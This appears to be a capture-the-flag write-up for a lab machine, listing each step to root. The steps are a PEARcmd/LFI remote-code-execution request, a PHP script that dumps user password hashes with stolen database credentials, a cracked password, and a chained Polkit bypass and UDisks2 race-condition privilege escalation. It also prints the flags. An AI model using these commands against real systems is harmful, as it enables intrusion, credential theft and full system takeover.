PENETRATION TESTING REPORT: PTERODACTYL
========================================

1. TARGET IDENTIFICATION
------------------------
Target Domain: panel.pterodactyl.htb
Target OS: openSUSE Leap 15.6

2. INITIAL ACCESS (FOOTHOLD)
----------------------------
Vulnerability: RCE via CVE-2025-49132 (PEARcmd + LFI)
Method: Writing a PHP database query script to /tmp.

Command (Stage 1 - Writing the script via RCE):
curl -s -g -k "http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/+/tmp/wecho.php"

Command (Stage 2 - Database Extraction via PHP PDO from shell):
echo '<?php
$d=new PDO("mysql:host=127.0.0.1;dbname=panel", "pterodactyl", "PteraPanel");
$s=$d->query("SELECT username,email,password FROM users");
print_r($s->fetchAll(PDO::FETCH_ASSOC));
?>' > /tmp/dbq.php

Execution:
php /tmp/dbq.php

3. ENUMERATION & DATABASE EXTRACTION
------------------------------------
Database: MariaDB 11.8.3
Credentials found in /var/www/pterodactyl/.env:
- DB_USERNAME: pterodactyl
- DB_PASSWORD: PteraPanel

Extracted User Hashes:
- headmonitor: $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2
- phileasfogg3: $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi

4. LATERAL MOVEMENT
-------------------
Target User: phileasfogg3
Cracked Password: !QAZ2wsx (Hashcat mode 3200 with rockyou.txt)

Interactive Shell Upgrade:
python3 -c 'import pty; pty.spawn("/bin/bash")'

Switch User:
su phileasfogg3

User Flag (user.txt):
90f9d4ef4d1dac6f39d6943982a619ec

5. PRIVILEGE ESCALATION (ROOT)
------------------------------
Exploit Chain: CVE-2025-6018 (Polkit Bypass) -> CVE-2025-6019 (UDisks2 Race Condition)

Step A: Polkit Session Bypass (CVE-2025-6018)
Commands:
echo "XDG_SEAT=seat0" >> ~/.pam_environment
echo "XDG_VTNR=1" >> ~/.pam_environment
# Requires re-login (exit and SSH back in)

Step B: UDisks2 Race Condition (CVE-2025-6019)
Components: exploit.img (XFS), catcher (C binary), exploit.sh

Execution:
cd /tmp
chmod +x catcher exploit.sh
./exploit.sh

Final Result:
whoami -> root
Root Flag (root.txt):
c6d1c570e4d8bc2e3804e370a53eb03ea
